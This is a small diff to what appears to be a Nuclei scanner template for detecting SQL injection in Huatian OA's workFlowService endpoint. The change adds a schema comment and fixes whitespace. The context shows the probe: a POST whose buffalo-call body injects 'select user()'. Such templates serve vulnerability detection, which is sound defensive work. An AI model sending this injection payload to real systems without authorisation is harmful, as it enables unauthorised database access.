@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: huatianOA-workFlowService-sql
 
 info:
@@ -9,7 +10,7 @@ http:
   - method: POST
     path:
       - "{{BaseURL}}/OAapp/bfapp/buffalo/workFlowService"
-    
+
     body: "<buffalo-call> <method>getDataListForTree</method> <string>select user()</string> </buffalo-call>"
 
     matchers-condition: and
